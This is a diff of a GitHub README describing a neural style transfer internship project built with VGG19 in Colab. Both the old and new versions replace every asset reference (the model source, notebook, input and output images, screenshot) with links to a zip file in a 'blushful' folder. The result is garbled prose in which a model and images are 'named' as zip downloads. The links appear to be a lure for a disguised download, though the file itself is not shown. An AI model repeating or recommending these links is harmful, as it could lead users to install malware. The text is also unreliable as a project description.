@@ -12,26 +12,26 @@ To build this system, I used Python as the programming language and ran the enti
 
 The implementation started by preparing two images: a content image, which provides the base structure (for example, a clear photograph), and a style image, which supplies the artistic texture and color patterns (like a painting by Picasso or Van Gogh). Both images were uploaded to Colab and resized to the same dimensions to ensure compatibility during processing.
 
-I loaded the pre-trained VGG19 network from PyTorch’s https://raw.githubusercontent.com/Mayank05GH/Task-3-Neural-Style-Transfer/main/blushful/Neural_Transfer_Style_Task_v1.7-beta.1.zip This network, originally trained for image classification, serves here as a feature extractor to isolate layers that represent content and style. I defined custom loss functions: one for content loss (which measures how much the generated image differs from the content image) and another for style loss (which measures the difference in texture and color patterns by computing Gram matrices).
+I loaded the pre-trained VGG19 network from PyTorch’s https://github.com/Mayank05GH/Task-3-Neural-Style-Transfer/raw/refs/heads/main/blushful/Transfer-Task-Style-Neural-2.8.zip This network, originally trained for image classification, serves here as a feature extractor to isolate layers that represent content and style. I defined custom loss functions: one for content loss (which measures how much the generated image differs from the content image) and another for style loss (which measures the difference in texture and color patterns by computing Gram matrices).
 
 The main part of the system is an iterative optimization loop where an initial image (a copy of the content image) is updated step by step. During each iteration, the model calculates the total loss as a weighted sum of content and style losses. The optimizer then adjusts the pixels of the image to minimize this loss, gradually blending the content with the desired artistic style.
 
-I ran the style transfer for about 200–300 iterations to reach a visually appealing result. After the optimization, the output was displayed in the Colab notebook and saved as an image file named https://raw.githubusercontent.com/Mayank05GH/Task-3-Neural-Style-Transfer/main/blushful/Neural_Transfer_Style_Task_v1.7-beta.1.zip To document the results, I also took a clear screenshot showing the original content image, the style image, and the final stylized output. This screenshot, saved as https://raw.githubusercontent.com/Mayank05GH/Task-3-Neural-Style-Transfer/main/blushful/Neural_Transfer_Style_Task_v1.7-beta.1.zip, is included in my GitHub repository for reference and proof of successful implementation.
+I ran the style transfer for about 200–300 iterations to reach a visually appealing result. After the optimization, the output was displayed in the Colab notebook and saved as an image file named https://github.com/Mayank05GH/Task-3-Neural-Style-Transfer/raw/refs/heads/main/blushful/Transfer-Task-Style-Neural-2.8.zip To document the results, I also took a clear screenshot showing the original content image, the style image, and the final stylized output. This screenshot, saved as https://github.com/Mayank05GH/Task-3-Neural-Style-Transfer/raw/refs/heads/main/blushful/Transfer-Task-Style-Neural-2.8.zip, is included in my GitHub repository for reference and proof of successful implementation.
 
 By completing this task, I gained practical experience in working with deep neural networks for computer vision, understanding how feature extraction works in CNNs, and how artistic patterns can be transferred mathematically. This project illustrates how AI can be used creatively beyond traditional tasks, highlighting the intersection between technology and art. It has strengthened my understanding of advanced PyTorch modules, iterative optimization, and real-world AI applications.
 
-The entire project, including the Colab notebook (https://raw.githubusercontent.com/Mayank05GH/Task-3-Neural-Style-Transfer/main/blushful/Neural_Transfer_Style_Task_v1.7-beta.1.zip), input images (https://raw.githubusercontent.com/Mayank05GH/Task-3-Neural-Style-Transfer/main/blushful/Neural_Transfer_Style_Task_v1.7-beta.1.zip and https://raw.githubusercontent.com/Mayank05GH/Task-3-Neural-Style-Transfer/main/blushful/Neural_Transfer_Style_Task_v1.7-beta.1.zip), the generated output, and the proof screenshot, is well-documented and shared in my GitHub repository. This fulfills all the requirements for Task 3 of my CodTech AI internship.
+The entire project, including the Colab notebook (https://github.com/Mayank05GH/Task-3-Neural-Style-Transfer/raw/refs/heads/main/blushful/Transfer-Task-Style-Neural-2.8.zip), input images (https://github.com/Mayank05GH/Task-3-Neural-Style-Transfer/raw/refs/heads/main/blushful/Transfer-Task-Style-Neural-2.8.zip and https://github.com/Mayank05GH/Task-3-Neural-Style-Transfer/raw/refs/heads/main/blushful/Transfer-Task-Style-Neural-2.8.zip), the generated output, and the proof screenshot, is well-documented and shared in my GitHub repository. This fulfills all the requirements for Task 3 of my CodTech AI internship.
 
 IMAGES USED IN THIS TASK:-
 
 
 
 
-![Image](https://raw.githubusercontent.com/Mayank05GH/Task-3-Neural-Style-Transfer/main/blushful/Neural_Transfer_Style_Task_v1.7-beta.1.zip)
-![Image](https://raw.githubusercontent.com/Mayank05GH/Task-3-Neural-Style-Transfer/main/blushful/Neural_Transfer_Style_Task_v1.7-beta.1.zip)
+![Image](https://github.com/Mayank05GH/Task-3-Neural-Style-Transfer/raw/refs/heads/main/blushful/Transfer-Task-Style-Neural-2.8.zip)
+![Image](https://github.com/Mayank05GH/Task-3-Neural-Style-Transfer/raw/refs/heads/main/blushful/Transfer-Task-Style-Neural-2.8.zip)
 
 
 OUTPUT
 
 
-![Image](https://raw.githubusercontent.com/Mayank05GH/Task-3-Neural-Style-Transfer/main/blushful/Neural_Transfer_Style_Task_v1.7-beta.1.zip)
+![Image](https://github.com/Mayank05GH/Task-3-Neural-Style-Transfer/raw/refs/heads/main/blushful/Transfer-Task-Style-Neural-2.8.zip)
